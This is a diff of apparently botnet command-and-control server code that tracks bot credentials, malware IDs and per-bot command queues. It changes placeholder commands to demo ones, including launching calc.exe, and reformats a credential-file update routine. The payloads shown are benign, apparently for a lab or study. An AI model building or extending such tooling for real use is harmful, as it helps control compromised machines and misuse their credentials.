@@ -13,7 +13,8 @@ used_bots_credentials = []
 malware_ids_used = []
 executing_command_ids_per_bot = {}
 finished_command_ids_per_bot = {}
-commands = {'1': "first", '2': "second", '3': "third"}
+commands = {'1': "print hello1",
+            '2': "run C:\\Windows\\System32\\calc.exe", '3': "print hello2"}
 
 
 def initialize_new_bot(bootstrap_list_id, bot_id):
@@ -157,12 +158,15 @@ def update_creds():
     # read available
     global available_bots_credentials
     global used_bots_credentials
-    available_bots_credentials = json.loads(open(NEW_CREDS_FILE).read())["creds"]
+    available_bots_credentials = json.loads(
+        open(NEW_CREDS_FILE).read())["creds"]
     # update used
-    old_used_bots_credentials = json.loads(open(USED_CREDS_FILE).read())["creds"]
-    used_bots_credentials = utils.add_lists(used_bots_credentials, old_used_bots_credentials)
+    old_used_bots_credentials = json.loads(
+        open(USED_CREDS_FILE).read())["creds"]
+    used_bots_credentials = utils.add_lists(
+        used_bots_credentials, old_used_bots_credentials)
     # print( used_bots_credentials)
-    json_object = json.dumps({"creds":used_bots_credentials}, indent = 4)
+    json_object = json.dumps({"creds": used_bots_credentials}, indent=4)
     with open(USED_CREDS_FILE, "w") as outfile:
         outfile.write(json_object)
     # subtract used from available
